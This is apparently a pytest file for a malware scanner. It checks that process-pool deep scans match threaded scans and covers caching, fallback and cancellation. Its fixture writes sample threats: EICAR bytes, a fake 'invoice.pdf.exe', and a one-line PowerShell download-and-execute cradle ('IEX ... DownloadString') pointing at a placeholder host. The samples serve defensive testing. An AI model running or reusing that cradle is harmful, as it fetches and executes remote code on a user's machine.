"""Deep scans fan out to worker processes; results must equal the threaded scanner's."""

import zipfile

import pytest

from aegis.scanners import files as fs
from aegis.scanners.base import ScanContext


def _tree(root, eicar):
    (root / "a").mkdir()
    (root / "b" / "c").mkdir(parents=True)
    (root / "a" / "eicar.com").write_bytes(eicar)
    (root / "b" / "drop.ps1").write_text("IEX (New-Object Net.WebClient).DownloadString('http://x/a')")
    (root / "b" / "c" / "invoice.pdf.exe").write_bytes(b"MZ" + b"\0" * 64)
    with zipfile.ZipFile(root / "b" / "bundle.zip", "w") as z:
        z.writestr("inner/eicar.com", eicar)
    for i in range(60):
        (root / "a" / f"clean{i}.txt").write_text(f"hello {i}\n" * 20)
        (root / "b" / f"lib{i}.py").write_text(f"def f{i}():\n    return {i}\n")


def _run(ctx, mode):
    ctx.options["file_scan_mode"] = mode
    ctx.stats.clear()
    out = list(fs.FileScanner().run(ctx))
    return sorted((f.rule_id, f.location) for f in out), dict(ctx.stats)


@pytest.fixture
def deep_ctx(ctx, tmp_path, eicar_bytes):
    root = tmp_path / "scanroot"
    root.mkdir()
    _tree(root, eicar_bytes)
    ctx.paths = [root]
    ctx.deep = True
    ctx.config.use_cache = False
    return ctx


def test_processes_match_threads(deep_ctx):
    threads, st_t = _run(deep_ctx, "threads")
    procs, st_p = _run(deep_ctx, "processes")
    assert threads == procs
    assert any(r == "AEG-SIG-HASH" for r, _ in procs) and any("bundle.zip!inner/eicar.com" in loc for _, loc in procs)
    assert st_p["files_scanned"] == st_t["files_scanned"] > 100
    assert st_p.get("file_scan_workers", 0) >= 2


def test_process_mode_uses_and_fills_cache(deep_ctx):
    deep_ctx.config.use_cache = True
    first, st1 = _run(deep_ctx, "processes")
    second, st2 = _run(deep_ctx, "processes")
    assert first == second  # infected files are never cached as clean
    assert st2.get("files_cached", 0) >= 100 and st2.get("files_scanned", 0) < st1["files_scanned"]


def test_falls_back_to_threads_when_pool_unavailable(deep_ctx, monkeypatch):
    import concurrent.futures

    def boom(*a, **k):
        raise OSError("no semaphores")

    monkeypatch.setattr(concurrent.futures, "ProcessPoolExecutor", boom)
    found, stats = _run(deep_ctx, "processes")
    assert any(r == "AEG-SIG-HASH" for r, _ in found) and "file_scan_workers" not in stats


def test_auto_mode_selection(ctx):
    ctx.deep = False
    assert fs._scan_mode(ctx) == "threads"
    ctx.deep = True
    assert fs._scan_mode(ctx) in ("processes", "threads")
    ctx.options["file_scan_mode"] = "threads"
    assert fs._scan_mode(ctx) == "threads"


def test_cancel_stops_process_scan(deep_ctx):
    deep_ctx.options["file_scan_mode"] = "processes"
    gen = fs.FileScanner().run(deep_ctx)
    deep_ctx.cancel.set()
    list(gen)  # must return promptly without hanging on outstanding work


def test_broken_pool_mid_scan_loses_no_files(deep_ctx, monkeypatch):
    """If worker processes die, in-flight and remaining files are scanned by the thread path."""
    from concurrent.futures.process import BrokenProcessPool

    expected, _ = _run(deep_ctx, "threads")

    def flaky_worker(path):
        raise BrokenProcessPool("worker died")

    monkeypatch.setattr(fs, "_worker_scan", flaky_worker)  # every submitted job fails
    found, stats = _run(deep_ctx, "processes")
    assert found == expected
    assert stats.get("files_rescanned_in_process", 0) > 0 or stats.get("file_scan_pool_failures", 0) > 0


def test_stdin_programs_use_threads(ctx, monkeypatch):
    import sys
    import types

    fake_main = types.ModuleType("__main__")
    fake_main.__file__ = "<stdin>"
    fake_main.__spec__ = None
    monkeypatch.setitem(sys.modules, "__main__", fake_main)
    ctx.deep = True
    ctx.options["file_scan_mode"] = "processes"
    assert fs._scan_mode(ctx) == "threads"
